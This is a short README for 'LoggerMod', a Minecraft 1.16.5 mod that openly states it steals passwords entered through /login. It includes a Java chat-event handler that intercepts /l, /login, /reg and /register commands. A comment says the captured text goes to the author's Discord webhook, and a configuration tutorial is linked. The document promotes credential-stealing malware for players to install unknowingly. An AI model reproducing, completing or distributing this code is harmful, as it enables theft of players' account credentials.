# 🔌 LoggerMod
This mod on 1.16.5 steals the entered passwords (Entered via /login)


# ⚡ How to configure?
You can easily change the config for yourself  
Tutorial: [Click](https://www.youtube.com/watch?v=RxuuHBnjgj0) (in Russian)

# ❓ How it Works?
```java
    @SubscribeEvent
    public void ChatEvent(ClientChatEvent e) {
        String msg = e.getMessage();
        String[] sentences = e.getMessage().split(" ");
        if ((msg.startsWith("/l") || msg.startsWith("/login") || msg.startsWith("/reg") || msg.startsWith("/register")) && sentences.length > 1) {
            // Sending to your discord server use Webhook
        }
    }

``` 
